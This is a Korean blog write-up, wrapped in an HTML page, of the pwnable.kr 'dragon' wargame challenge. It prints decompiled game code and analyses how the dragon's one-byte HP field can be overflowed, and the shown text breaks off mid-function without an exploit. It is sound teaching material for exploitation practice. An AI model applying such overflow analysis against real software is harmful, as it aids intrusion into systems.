@@ -1,0 +1,720 @@
+<!DOCTYPE html>
+<html lang="en" itemscope itemtype="http://schema.org/WebPage">
+  <head>
+    
+
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+  <title>2st Problem - dowoo - Eiparyen</title>
+  <meta property="og:title" content="2st Problem - dowoo" />
+  <meta name="twitter:title" content="2st Problem - dowoo" />
+  <meta name="description" content="http://pwnable.kr - Rookiss - dragon deadline - 2018.12.20 18:00 일단 백문이 불여일견이라고.. 한번 해보자. nc pwnable.kr 9004
+Welcome to Dragon Hunter! Choose Your Hero [ 1 ] Priest [ 2 ] Knight 흠.. 한마디로 드래곤을 죽이는 것이다.. 뭐 직접 해보면 알겠지 스킵!
+음.. 근데 어미드래곤이나 베이비 드래곤이나 어의 없게 한틱남기고 못죽인다. 뭣이런 ㅈ같은 게임이 다있누.. 한껏 무기력함을 느끼고 바이너리를 받아서 분석해보자! http://pwnable.kr/bin/dragon
+이번엔 c 언어를 주지않으셨다&hellip; 하&hellip; 아이다..쓸까?? 쓰자쓰자 !">
+  <meta property="og:description" content="http://pwnable.kr - Rookiss - dragon deadline - 2018.12.20 18:00 일단 백문이 불여일견이라고.. 한번 해보자. nc pwnable.kr 9004
+Welcome to Dragon Hunter! Choose Your Hero [ 1 ] Priest [ 2 ] Knight 흠.. 한마디로 드래곤을 죽이는 것이다.. 뭐 직접 해보면 알겠지 스킵!
+음.. 근데 어미드래곤이나 베이비 드래곤이나 어의 없게 한틱남기고 못죽인다. 뭣이런 ㅈ같은 게임이 다있누.. 한껏 무기력함을 느끼고 바이너리를 받아서 분석해보자! http://pwnable.kr/bin/dragon
+이번엔 c 언어를 주지않으셨다&hellip; 하&hellip; 아이다..쓸까?? 쓰자쓰자 !">
+  <meta name="twitter:description" content="http://pwnable.kr - Rookiss - dragon deadline - 2018.12.20 18:00 일단 백문이 불여일견이라고.. 한번 해보자. nc pwnable.kr 9004
+Welcome to Dragon Hunter! Choose Your Hero [ 1 ] Priest [ 2 ] Knight 흠.. 한마디로 드래곤을 죽이는 것이 …"><script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "WebSite",
+    "name": "Eiparyen",
+    
+    "url": "https:\/\/eiparyen.github.io"
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Organization",
+  "name": "",
+  "url": "https:\/\/eiparyen.github.io"
+  
+  
+  
+  
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+        "@type": "ListItem",
+        "position": 1,
+        "item": {
+          "@id": "https:\/\/eiparyen.github.io",
+          "name": "home"
+        }
+    },{
+        "@type": "ListItem",
+        "position": 3,
+        "item": {
+          "@id": "https:\/\/eiparyen.github.io\/pwnable\/2018-12-19\/",
+          "name": "2st problem dowoo"
+        }
+    }]
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "author": {
+    "name" : "arizona"
+  },
+  "headline": "2st Problem - dowoo",
+  "description" : "http:\/\/pwnable.kr - Rookiss - dragon deadline - 2018.12.20 18:00 일단 백문이 불여일견이라고.. 한번 해보자. nc pwnable.kr 9004\nWelcome to Dragon Hunter! Choose Your Hero [ 1 ] Priest [ 2 ] Knight 흠.. 한마디로 드래곤을 죽이는 것이다.. 뭐 직접 해보면 알겠지 스킵!\n음.. 근데 어미드래곤이나 베이비 드래곤이나 어의 없게 한틱남기고 못죽인다. 뭣이런 ㅈ같은 게임이 다있누.. 한껏 무기력함을 느끼고 바이너리를 받아서 분석해보자! http:\/\/pwnable.kr\/bin\/dragon\n이번엔 c 언어를 주지않으셨다\x26hellip; 하\x26hellip; 아이다..쓸까?? 쓰자쓰자 !",
+  "inLanguage" : "en",
+  "wordCount":  997 ,
+  "datePublished" : "2018-12-13T00:00:00",
+  "dateModified" : "2018-12-13T00:00:00",
+  "image" : "https:\/\/eiparyen.github.io",
+  "keywords" : [ "pwnable" ],
+  "mainEntityOfPage" : "https:\/\/eiparyen.github.io\/pwnable\/2018-12-19\/",
+  "publisher" : {
+    "@type": "Organization",
+    "name" : "https:\/\/eiparyen.github.io",
+    "logo" : {
+        "@type" : "ImageObject",
+        "url" : "https:\/\/eiparyen.github.io",
+        "height" :  60 ,
+        "width" :  60
+    }
+  }
+}
+</script>
+
+<meta property="og:title" content="2st Problem - dowoo" />
+<meta property="og:description" content="http://pwnable.kr - Rookiss - dragon deadline - 2018.12.20 18:00 일단 백문이 불여일견이라고.. 한번 해보자. nc pwnable.kr 9004
+Welcome to Dragon Hunter! Choose Your Hero [ 1 ] Priest [ 2 ] Knight 흠.. 한마디로 드래곤을 죽이는 것이다.. 뭐 직접 해보면 알겠지 스킵!
+음.. 근데 어미드래곤이나 베이비 드래곤이나 어의 없게 한틱남기고 못죽인다. 뭣이런 ㅈ같은 게임이 다있누.. 한껏 무기력함을 느끼고 바이너리를 받아서 분석해보자! http://pwnable.kr/bin/dragon
+이번엔 c 언어를 주지않으셨다&hellip; 하&hellip; 아이다..쓸까?? 쓰자쓰자 !">
+<meta property="og:url" content="https://eiparyen.github.io/pwnable/2018-12-19/" />
+<meta property="og:type" content="website" />
+<meta property="og:site_name" content="Eiparyen" />
+  <meta name="twitter:title" content="2st Problem - dowoo" />
+  <meta name="twitter:description" content="http://pwnable.kr - Rookiss - dragon deadline - 2018.12.20 18:00 일단 백문이 불여일견이라고.. 한번 해보자. nc pwnable.kr 9004
+Welcome to Dragon Hunter! Choose Your Hero [ 1 ] Priest [ 2 ] Knight 흠.. 한마디로 드래곤을 죽이는 것이 …">
+  <meta name="twitter:card" content="summary" />
+  <meta name="twitter:card" content="summary" />
+  <meta property="og:url" content="https://eiparyen.github.io/pwnable/2018-12-19/" />
+  <meta property="og:type" content="website" />
+  <meta property="og:site_name" content="Eiparyen" />
+
+  <meta name="generator" content="Hugo 0.54-DEV" />
+  <link rel="alternate" href="https://eiparyen.github.io/index.xml" type="application/rss+xml" title="Eiparyen">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://eiparyen.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" />
+  <link rel="stylesheet" href="https://eiparyen.github.io/css/highlight.min.css" /><link rel="stylesheet" href="https://eiparyen.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Sans+KR:400,700" />
+<link rel="stylesheet" href="https://eiparyen.github.io/css/custom.css" />
+
+
+
+  </head>
+  <body>
+    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="https://eiparyen.github.io">Eiparyen</a>
+    </div>
+
+    <div class="collapse navbar-collapse" id="main-navbar">
+      <ul class="nav navbar-nav navbar-right">
+        
+          
+            <li>
+              <a title="About" href="/about/">About</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="pwnable" href="/pwnable/">pwnable</a>
+            </li>
+          
+        
+
+        
+
+        
+      </ul>
+    </div>
+
+    
+
+  </div>
+</nav>
+
+
+
+
+    
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+
+  
+  
+  
+
+
+
+
+
+
+  
+
+  <header class="header-section ">
+    
+    <div class="intro-header no-img">
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+            <div class="post-heading">
+              
+                <h1>2st Problem - dowoo</h1>
+              
+              
+              
+              
+                <span class="post-meta">
+  
+  
+  <i class="fas fa-calendar"></i>&nbsp;Posted on December 13, 2018
+  
+  
+  
+  
+    &nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;arizona
+  
+  
+</span>
+
+
+              
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+
+    
+<div class="container" role="main">
+  <div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+      <article role="main" class="blog-post">
+        
+
+<h3 id="http-pwnable-kr-rookiss-dragon"><a href="http://pwnable.kr" target="_blank">http://pwnable.kr</a> - Rookiss - dragon</h3>
+
+<p><span style="color:red">deadline</span>
+ - 2018.12.20 <span style="color:purple">18:00</span>
+</p>
+
+<p>일단 백문이 불여일견이라고.. 한번 해보자.
+nc pwnable.kr 9004</p>
+<div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh">Welcome to Dragon Hunter!
+Choose Your Hero
+<span class="o">[</span> <span class="m">1</span> <span class="o">]</span> Priest
+<span class="o">[</span> <span class="m">2</span> <span class="o">]</span> Knight</code></pre></div>
+<p>흠.. 한마디로 드래곤을 죽이는 것이다.. 뭐 직접 해보면 알겠지 스킵!</p>
+
+<p>음.. 근데 어미드래곤이나 베이비 드래곤이나 어의 없게 한틱남기고 못죽인다. 뭣이런 ㅈ같은 게임이 다있누..
+한껏 무기력함을 느끼고 바이너리를 받아서 분석해보자!
+<a href="http://pwnable.kr/bin/dragon" target="_blank">http://pwnable.kr/bin/dragon</a></p>
+
+<p>이번엔 c 언어를 주지않으셨다&hellip; 하&hellip; 아이다..쓸까?? 쓰자쓰자 ! ㅇㅋㅇㅋ</p>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Welcome to Dragon Hunter!&#34;</span><span class="p">);</span>
+  <span class="n">PlayGame</span><span class="p">();</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></div>
+<p>와우.. gdb 로 보다가 이걸로보니까.. 넘모 깔끔한거있지..</p>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">PlayGame</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax
+</span><span class="c1"></span>
+  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Choose Your Hero</span><span class="se">\n</span><span class="s">[ 1 ] Priest</span><span class="se">\n</span><span class="s">[ 2 ] Knight&#34;</span><span class="p">);</span>
+      <span class="n">result</span> <span class="o">=</span> <span class="n">GetChoice</span><span class="p">();</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="n">result</span> <span class="o">!=</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="n">result</span> <span class="o">!=</span> <span class="mi">2</span> <span class="p">)</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="n">FightDragon</span><span class="p">(</span><span class="n">result</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">result</span> <span class="o">!=</span> <span class="mi">3</span> <span class="p">)</span>
+      <span class="k">break</span><span class="p">;</span>
+    <span class="n">SecretLevel</span><span class="p">();</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span></code></pre></div>
+<p>맨처음 1, 2를 누르는게 GetChice() 고,, 드래곤이랑 싸우는게 FightDragon() 이고,,
+엥 3번을 누르면 SecretLevel() 이 나온단다.. 안써놨었네 벌써부터 게싱능력 딸리는게 드러난다.
+입력할수있는 함수가.. GetChoice, FightDragon, SecretLevel 이거 세개다. 다봐야겠다 ㅠㅠ 취약점찾아보까?</p>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">GetChoice</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [esp+1Ch] [ebp-Ch]
+</span><span class="c1"></span>
+  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v1</span><span class="p">);</span>
+  <span class="k">while</span> <span class="p">(</span> <span class="n">getchar</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">10</span> <span class="p">);</span> <span class="k">return</span> <span class="n">v1</span><span class="p">;</span>
+<span class="p">}</span></code></pre></div>
+<p>윽&hellip; 이함수는 아니야..</p>
+<div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh">void __cdecl FightDragon<span class="o">(</span>int a1<span class="o">)</span>
+<span class="o">{</span>
+  char v1<span class="p">;</span> // al
+  void *v2<span class="p">;</span> // ST1C_4
+  int v3<span class="p">;</span> // <span class="o">[</span>esp+10h<span class="o">]</span> <span class="o">[</span>ebp-18h<span class="o">]</span>
+  _DWORD *ptr<span class="p">;</span> // <span class="o">[</span>esp+14h<span class="o">]</span> <span class="o">[</span>ebp-14h<span class="o">]</span>
+  _DWORD *v5<span class="p">;</span> // <span class="o">[</span>esp+18h<span class="o">]</span> <span class="o">[</span>ebp-10h<span class="o">]</span>
+
+  <span class="nv">ptr</span> <span class="o">=</span> malloc<span class="o">(</span>0x10u<span class="o">)</span><span class="p">;</span>
+  <span class="nv">v5</span> <span class="o">=</span> malloc<span class="o">(</span>0x10u<span class="o">)</span><span class="p">;</span>
+  <span class="nv">v1</span> <span class="o">=</span> Count++<span class="p">;</span>
+  <span class="k">if</span> <span class="o">(</span> v1 <span class="p">&amp;</span> <span class="m">1</span> <span class="o">)</span>
+  <span class="o">{</span>
+    v5<span class="o">[</span><span class="m">1</span><span class="o">]</span> <span class="o">=</span> <span class="m">1</span><span class="p">;</span>
+    *<span class="o">((</span>_BYTE *<span class="o">)</span>v5 + <span class="m">8</span><span class="o">)</span> <span class="o">=</span> <span class="m">80</span><span class="p">;</span>
+    *<span class="o">((</span>_BYTE *<span class="o">)</span>v5 + <span class="m">9</span><span class="o">)</span> <span class="o">=</span> <span class="m">4</span><span class="p">;</span>
+    v5<span class="o">[</span><span class="m">3</span><span class="o">]</span> <span class="o">=</span> <span class="m">10</span><span class="p">;</span>
+    *v5 <span class="o">=</span> PrintMonsterInfo<span class="p">;</span>
+    puts<span class="o">(</span><span class="s2">&#34;Mama Dragon Has Appeared!&#34;</span><span class="o">)</span><span class="p">;</span>
+  <span class="o">}</span>
+  <span class="k">else</span>
+  <span class="o">{</span>
+    v5<span class="o">[</span><span class="m">1</span><span class="o">]</span> <span class="o">=</span> <span class="m">0</span><span class="p">;</span>
+    *<span class="o">((</span>_BYTE *<span class="o">)</span>v5 + <span class="m">8</span><span class="o">)</span> <span class="o">=</span> <span class="m">50</span><span class="p">;</span>
+    *<span class="o">((</span>_BYTE *<span class="o">)</span>v5 + <span class="m">9</span><span class="o">)</span> <span class="o">=</span> <span class="m">5</span><span class="p">;</span>
+    v5<span class="o">[</span><span class="m">3</span><span class="o">]</span> <span class="o">=</span> <span class="m">30</span><span class="p">;</span>
+    *v5 <span class="o">=</span> PrintMonsterInfo<span class="p">;</span>
+    puts<span class="o">(</span><span class="s2">&#34;Baby Dragon Has Appeared!&#34;</span><span class="o">)</span><span class="p">;</span>
+  <span class="o">}</span>
+  <span class="k">if</span> <span class="o">(</span> <span class="nv">a1</span> <span class="o">==</span> <span class="m">1</span> <span class="o">)</span>
+  <span class="o">{</span>
+    *ptr <span class="o">=</span> <span class="m">1</span><span class="p">;</span>
+    ptr<span class="o">[</span><span class="m">1</span><span class="o">]</span> <span class="o">=</span> <span class="m">42</span><span class="p">;</span>
+    ptr<span class="o">[</span><span class="m">2</span><span class="o">]</span> <span class="o">=</span> <span class="m">50</span><span class="p">;</span>
+    ptr<span class="o">[</span><span class="m">3</span><span class="o">]</span> <span class="o">=</span> PrintPlayerInfo<span class="p">;</span>
+    <span class="nv">v3</span> <span class="o">=</span> PriestAttack<span class="o">((</span>int<span class="o">)</span>ptr, v5<span class="o">)</span><span class="p">;</span>
+  <span class="o">}</span>
+  <span class="k">else</span>
+  <span class="o">{</span>
+    <span class="k">if</span> <span class="o">(</span> a1 !<span class="o">=</span> <span class="m">2</span> <span class="o">)</span>
+      <span class="k">return</span><span class="p">;</span>
+    *ptr <span class="o">=</span> <span class="m">2</span><span class="p">;</span>
+    ptr<span class="o">[</span><span class="m">1</span><span class="o">]</span> <span class="o">=</span> <span class="m">50</span><span class="p">;</span>
+    ptr<span class="o">[</span><span class="m">2</span><span class="o">]</span> <span class="o">=</span> <span class="m">0</span><span class="p">;</span>
+    ptr<span class="o">[</span><span class="m">3</span><span class="o">]</span> <span class="o">=</span> PrintPlayerInfo<span class="p">;</span>
+    <span class="nv">v3</span> <span class="o">=</span> KnightAttack<span class="o">((</span>int<span class="o">)</span>ptr, v5<span class="o">)</span><span class="p">;</span>
+  <span class="o">}</span>
+  <span class="k">if</span> <span class="o">(</span> v3 <span class="o">)</span>
+  <span class="o">{</span>
+    puts<span class="o">(</span><span class="s2">&#34;Well Done Hero! You Killed The Dragon!&#34;</span><span class="o">)</span><span class="p">;</span>
+    puts<span class="o">(</span><span class="s2">&#34;The World Will Remember You As:&#34;</span><span class="o">)</span><span class="p">;</span>
+    <span class="nv">v2</span> <span class="o">=</span> malloc<span class="o">(</span>0x10u<span class="o">)</span><span class="p">;</span>
+    __isoc99_scanf<span class="o">(</span><span class="s2">&#34;%16s&#34;</span>, v2<span class="o">)</span><span class="p">;</span>
+    puts<span class="o">(</span><span class="s2">&#34;And The Dragon You Have Defeated Was Called:&#34;</span><span class="o">)</span><span class="p">;</span>
+    <span class="o">((</span>void <span class="o">(</span>__cdecl *<span class="o">)(</span>_DWORD *<span class="o">))</span>*v5<span class="o">)(</span>v5<span class="o">)</span><span class="p">;</span>
+  <span class="o">}</span>
+  <span class="k">else</span>
+  <span class="o">{</span>
+    puts<span class="o">(</span><span class="s2">&#34;\nYou Have Been Defeated!&#34;</span><span class="o">)</span><span class="p">;</span>
+  <span class="o">}</span>
+  free<span class="o">(</span>ptr<span class="o">)</span><span class="p">;</span>
+<span class="o">}</span></code></pre></div>
+<p>흠 v1 은 랜덤요소가 없으니 무조건 baby 다음 Mommy 가 나온다.
+ptr, V5 는 heap 에 할당한 구조체구..</p>
+
+<p>딱보니까 dragon 구조체의 시작은 V5 이고,,</p>
+
+<p><span style="color:purple">V5 &#43; 8</span>
+ = 드래곤의 체력이 써있음!<br />
+<span style="color:purple">V5 &#43; 9</span>
+ = 한턴이 끝나고 드래곤이 회복하는 값이 저장되있음</p>
+
+<p><span style="color:red">여기서.. 이상함을 바로 느낀다면</span>
+ 당신은 천제&hellip; 하지만 나는 아하 그렇군! 하고 지나쳐나갔다.<br />
+뭐 쭈욱 보자면 a1 이 맨처음 우리가 썼던 직업고르기 숫자고,<br />
+ptr 은 싸우는사람의 구조체고..</p>
+
+<p><span style="color:purple">ptr &#43; 0</span>
+ = 프리스트는 1, 기사는 2 가 써있음<br />
+<span style="color:purple">ptr &#43; 4</span>
+ = 체력<br />
+<span style="color:purple">ptr &#43; 8</span>
+ = 마나<br />
+<span style="color:purple">ptr &#43; 12</span>
+ = PrintPlayerInfo ?</p>
+
+<p>쨋든.. 여기서 봐야됄 부분은.. 바로 체력을 담당하는 V5+8 부분이 한 바이트.. 즉 -127 ~ 127 범위밖에 가질수 없다는 소리이다. 즉 드래곤 체력을 계속 회복시켜줘서 127 이 넘으면 죽일수있다는소리..</p>
+
+<p>공격과정을 보자.</p>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">PriestAttack</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">ptr</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// eax
+</span><span class="c1"></span>
+  <span class="k">do</span>
+  <span class="p">{</span>
+    <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="p">(</span><span class="kr">__cdecl</span> <span class="o">**</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="p">))</span><span class="n">ptr</span><span class="p">)(</span><span class="n">ptr</span><span class="p">);</span>
+    <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="p">(</span><span class="kr">__cdecl</span> <span class="o">**</span><span class="p">)(</span><span class="kt">int</span><span class="p">))(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">12</span><span class="p">))(</span><span class="n">a1</span><span class="p">);</span>
+    <span class="n">v2</span> <span class="o">=</span> <span class="n">GetChoice</span><span class="p">();</span>
+    <span class="k">switch</span> <span class="p">(</span> <span class="n">v2</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Clarity! Your Mana Has Been Refreshed&#34;</span><span class="p">);</span>
+        <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="mi">50</span><span class="p">;</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;But The Dragon Deals %d Damage To You!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">3</span><span class="p">));</span>
+        <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">-=</span> <span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">3</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;And The Dragon Heals %d HP!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">*</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">9</span><span class="p">));</span>
+        <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+=</span> <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">9</span><span class="p">);</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">24</span> <span class="p">)</span>
+        <span class="p">{</span>
+          <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Not Enough MP!&#34;</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">else</span>
+        <span class="p">{</span>
+          <span class="n">puts</span><span class="p">(</span><span class="s">&#34;HolyShield! You Are Temporarily Invincible...&#34;</span><span class="p">);</span>
+          <span class="n">printf</span><span class="p">(</span><span class="s">&#34;But The Dragon Heals %d HP!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">*</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">9</span><span class="p">));</span>
+          <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+=</span> <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">9</span><span class="p">);</span>
+          <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">-=</span> <span class="mi">25</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">9</span> <span class="p">)</span>
+        <span class="p">{</span>
+          <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Not Enough MP!&#34;</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">else</span>
+        <span class="p">{</span>
+          <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Holy Bolt Deals %d Damage To The Dragon!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">20</span><span class="p">);</span>
+          <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">-=</span> <span class="mi">20</span><span class="p">;</span>
+          <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">-=</span> <span class="mi">10</span><span class="p">;</span>
